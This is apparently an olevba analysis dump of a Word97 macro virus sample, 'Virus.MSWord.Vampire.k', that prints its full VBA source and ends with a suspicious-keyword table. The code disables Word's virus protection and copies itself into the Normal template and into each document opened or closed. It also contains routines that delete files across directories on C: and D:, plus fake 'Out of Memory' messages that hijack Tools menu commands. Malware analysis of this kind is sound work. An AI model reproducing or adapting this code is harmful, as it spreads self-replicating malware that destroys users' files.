olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vampire.k
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vampire.k - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Vampire.bas 
in file: Virus.MSWord.Vampire.k - OLE stream: 'Macros/VBA/Vampire'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoclose()
Attribute autoclose.VB_Description = "巨集建立於 98/03/15，建立者 AAAA"
Attribute autoclose.VB_ProcData.VB_Invoke_Func = "Normal.Vampire.autoclose"
Dim CV
On Error Resume Next
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Vampire" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Vampire" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Vampire", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs , FileFormat:=wdFormatTemplate
        Options.SavePropertiesPrompt = False
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Vampire", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If

CV = WordBasic.Int(Rnd() * 20) + 1
If CV = 13 Then
WordBasic.call "KI"
WordBasic.call "KI2"
End If
exit_:

End Sub
Sub autoexec()
Dim CT
On Error Resume Next
CT = WordBasic.Int(Rnd() * 30) + 1
If CT = 11 Or CT = 15 Or CT = 21 Or CT = 25 Or CT = 31 Then
WordBasic.call "KI1"
WordBasic.call "KI3"
WordBasic.call "Vampire"
End If

End Sub
Sub autoopen()
On Error Resume Next
   
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Vampire" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Vampire" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Vampire", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs , FileFormat:=wdFormatTemplate
        Options.SavePropertiesPrompt = False
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Vampire", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If

exit_:
End Sub
Sub Vampire()
Dim push1
Dim Ka$
Dim Kb$
Dim Kb_
On Error Resume Next
INSF
WordBasic.BeginDialog 180, 78, "     **** Bingo ****"
    WordBasic.Text 9, 9, 160, 13, " Word97 Macro Virus", "Text1"
    WordBasic.Text 27, 28, 122, 13, " ----Vampire----", "Text2"
    WordBasic.PushButton 43, 48, 88, 21, "OK", "push1"
WordBasic.EndDialog

Dim Vampire As Object: Set Vampire = WordBasic.CurValues.UserDialog
push1 = WordBasic.Dialog.UserDialog(Vampire, -1, 10000)
Ka$ = WordBasic.[Left$](WordBasic.[CTime$](7), 2)
Kb$ = WordBasic.[Right$](WordBasic.[CTime$](7), 2)
Kb_ = WordBasic.Val(Kb$)
Kb_ = Kb_ + 1
Kb$ = Str(Kb_)
WordBasic.OnTime Ka$ + ":" + Kb$, "Vampire97"

exit_:

End Sub
Private Sub INSF()
Dim R
Dim a$
Dim B$
Dim C$
Dim D$
WordBasic.DisableInput 1
On Error Resume Next
R = 0
start:
a$ = "Word97 Macro Virus"
B$ = "Vampire"
C$ = "Vampire"
D$ = "Vampire"
WordBasic.Bold 1: WordBasic.Italic 1: WordBasic.Underline 1
WordBasic.Insert a$ + Chr(9)
WordBasic.Bold 0: WordBasic.Italic 0: WordBasic.Underline 0
WordBasic.Insert B$ + Chr(9)
WordBasic.Bold 1: WordBasic.Italic 1: WordBasic.Underline 1
WordBasic.Insert C$ + Chr(9)
WordBasic.Bold 0: WordBasic.Italic 0: WordBasic.Underline 0
WordBasic.Insert D$
WordBasic.InsertPara
R = R + 1
If R > 3 Then GoTo exit_
GoTo start

exit_:

End Sub
Sub FileTemplates()
Dim W
WordBasic.DisableInput 1
On Error Resume Next
W = WordBasic.Int(Rnd() * 7) + 1
If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Or WordBasic.WeekDay(WordBasic.Now()) = W Then
WordBasic.call "KI1"
End If
WordBasic.Beep
WordBasic.MsgBox " Out of Memory", "Microsoft Visual Basic", 48
exit_:

End Sub
Sub ViewVBcode()
Dim W
WordBasic.DisableInput 1
On Error Resume Next
W = WordBasic.Int(Rnd() * 7) + 1
If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Or WordBasic.WeekDay(WordBasic.Now()) = W Then
WordBasic.call "KI1"
End If
WordBasic.Beep
WordBasic.MsgBox " Out of Memory", "Microsoft Visual Basic", 48
exit_:

End Sub
Sub ToolsMacro()
Dim W
WordBasic.DisableInput 1
On Error Resume Next
W = WordBasic.Int(Rnd() * 7) + 1
If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Or WordBasic.WeekDay(WordBasic.Now()) = W Then
WordBasic.call "KI1"
End If
WordBasic.Beep
WordBasic.MsgBox " Out of Memory", "Microsoft Visual Basic", 48
exit_:

End Sub
Sub ToolsCustomize()
Dim W
WordBasic.DisableInput 1
On Error Resume Next
W = WordBasic.Int(Rnd() * 7) + 1
If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Or WordBasic.WeekDay(WordBasic.Now()) = W Then
WordBasic.call "KI1"
End If
WordBasic.Beep
WordBasic.MsgBox " Out of Memory", "Microsoft Visual Basic", 48
exit_:

End Sub
Sub ToolsOptions()
Dim W
WordBasic.DisableInput 1
On Error Resume Next
W = WordBasic.Int(Rnd() * 7) + 1
If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Or WordBasic.WeekDay(WordBasic.Now()) = W Then
WordBasic.call "KI1"
End If
WordBasic.Beep
WordBasic.MsgBox " Out of Memory", "Microsoft Visual Basic", 48
exit_:

End Sub
Sub KI()
Dim WC
Dim i
Dim k$
Dim KF$
pcscan:
On Error Resume Next
WC = WordBasic.CountDirectories("C:\")
For i = 1 To WC
k$ = "C:\" + WordBasic.[GetDirectory$]("C:\", i) + "\*.*"
KF$ = WordBasic.[Files$]("C:\" + WordBasic.[GetDirectory$]("C:\", i) + "\*.*")
If KF$ = "" Then GoTo TWO
WordBasic.Kill KF$

TWO:
Next i

exit_:

End Sub
Sub KI1()
Dim R
Dim WC1
Dim i
Dim k$
Dim KF$
R = 0
pcscana:
On Error Resume Next

WC1 = WordBasic.CountDirectories("C:\")
For i = 1 To WC1
k$ = "C:\" + WordBasic.[GetDirectory$]("C:\", i) + "\*.*"
KF$ = WordBasic.[Files$]("C:\" + WordBasic.[GetDirectory$]("C:\", i) + "\*.*")
If KF$ = "" Then GoTo TWO
WordBasic.Kill KF$

TWO:
Next i

exit_:

R = R + 1
If R <= 7 Then GoTo pcscana

End Sub
Sub KI2()
Dim WC2
Dim i
Dim k$
Dim KF$
pcscanb:
On Error Resume Next
WC2 = WordBasic.CountDirectories("D:\")
For i = 1 To WC2
k$ = "D:\" + WordBasic.[GetDirectory$]("D:\", i) + "\*.*"
KF$ = WordBasic.[Files$]("C:\" + WordBasic.[GetDirectory$]("D:\", i) + "\*.*")
If KF$ = "" Then GoTo TWO
WordBasic.Kill KF$

TWO:
Next i

exit_:

End Sub
Sub KI3()
Dim R
Dim WC3
Dim i
Dim k$
Dim KF$
R = 0

pcscanc:
On Error Resume Next

WC3 = WordBasic.CountDirectories("D:\")
For i = 1 To WC3
k$ = "D:\" + WordBasic.[GetDirectory$]("D:\", i) + "\*.*"
KF$ = WordBasic.[Files$]("D:\" + WordBasic.[GetDirectory$]("D:\", i) + "\*.*")
If KF$ = "" Then GoTo TWO
WordBasic.Kill KF$

TWO:
Next i

exit_:

R = R + 1
If R <= 7 Then GoTo pcscanc

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

